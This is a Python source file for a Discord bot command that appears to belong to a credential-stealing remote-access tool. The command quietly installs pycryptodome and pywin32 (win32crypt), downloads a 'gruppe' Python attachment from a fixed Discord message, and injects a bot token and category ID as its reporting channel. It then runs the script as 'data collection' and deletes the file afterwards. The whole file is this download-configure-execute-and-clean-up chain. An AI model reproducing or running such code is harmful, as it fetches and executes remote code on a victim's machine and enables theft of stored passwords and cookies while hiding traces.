import subprocess
import sys
import os
import discord

async def pass_heavy(ctx, bot_k, cat_id):
    """Install and run gruppe.py data collection tool"""
    
    # Install required non-standard packages
    required_packages = [
        "pycryptodome",
        "pywin32", 
        "requests"
    ]
    
    await ctx.send("🔧 Installing required packages...")
    
    for package in required_packages:
        try:
            # Try to import first to check if already installed
            if package == "pycryptodome":
                __import__('Crypto')
            elif package == "pywin32":
                __import__('win32crypt')
            elif package == "requests":
                __import__('requests')
            await ctx.send(f"✅ {package} already installed")
        except ImportError:
            # Install using pip
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                await ctx.send(f"✅ Installed {package}")
            except subprocess.CalledProcessError:
                await ctx.send(f"❌ Failed to install {package}")
                return
    
    await ctx.send("📥 Downloading gruppe.py from Discord...")
    
    try:
        # Search for the specific message with gruppe.py
        message_id = 1425676504775528589
        
        try:
            message = await ctx.channel.fetch_message(message_id)
        except discord.NotFound:
            await ctx.send("❌ Could not find the gruppe.py file (message not found)")
            return
        except discord.Forbidden:
            await ctx.send("❌ No permission to access messages in this channel")
            return
        except discord.HTTPException as e:
            await ctx.send(f"❌ Error fetching message: {str(e)}")
            return
        
        # Check if the message has attachments
        if message.attachments:
            for attachment in message.attachments:
                if attachment.filename.endswith('.py') and 'gruppe' in attachment.filename.lower():
                    # Download the file
                    file_content = await attachment.read()
                    gruppe_path = os.path.join(os.getcwd(), "gruppe_installer.py")
                    
                    with open(gruppe_path, 'wb') as f:
                        f.write(file_content)
                    
                    await ctx.send("✅ Successfully downloaded gruppe.py")
                    
                    # Modify the file to include bot token and category ID
                    await ctx.send("🔧 Configuring gruppe.py with provided credentials...")
                    
                    try:
                        with open(gruppe_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        
                        # Replace bot token
                        if "bot.run(" in content:
                            import re
                            content = re.sub(r"bot\.run\(['\"][^'\"]*['\"]\)", f"bot.run('{bot_k}')", content)
                        
                        # Replace category ID  
                        if 'category_id=' in content:
                            import re
                            content = re.sub(r'category_id=["\'][^"\']*["\']', f'category_id="{cat_id}"', content)
                        
                        # Write the modified content back
                        with open(gruppe_path, 'w', encoding='utf-8') as f:
                            f.write(content)
                            
                        await ctx.send("✅ Configuration applied successfully")
                        
                    except Exception as e:
                        await ctx.send(f"❌ Error configuring file: {str(e)}")
                        return
                    
                    await ctx.send("🚀 Starting data collection... This may take a few minutes...")
                    
                    # Run the gruppe.py file
                    try:
                        process = subprocess.Popen([
                            sys.executable, gruppe_path
                        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                        
                        # Wait for completion with timeout
                        try:
                            stdout, stderr = process.communicate(timeout=600)  # 10 minute timeout
                            
                            if process.returncode == 0:
                                await ctx.send("✅ Data collection completed successfully!")
                            else:
                                error_msg = stderr[:500] if stderr else "Unknown error"
                                await ctx.send(f"⚠️ Completed with warnings: {error_msg}")
                                
                        except subprocess.TimeoutExpired:
                            process.kill()
                            await ctx.send("⏰ Data collection timed out after 10 minutes")
                            
                    except Exception as e:
                        await ctx.send(f"❌ Error running gruppe.py: {str(e)}")
                    
                    # Clean up
                    try:
                        os.remove(gruppe_path)
                        await ctx.send("🧹 Cleaned up temporary files")
                    except:
                        pass
                    
                    return  # Exit after processing first valid file
                    
            await ctx.send("❌ No valid gruppe.py file found in the message")
        else:
            await ctx.send("❌ No attachments found in the specified message")
            
    except Exception as e:
        await ctx.send(f"❌ Error during installation: {str(e)}")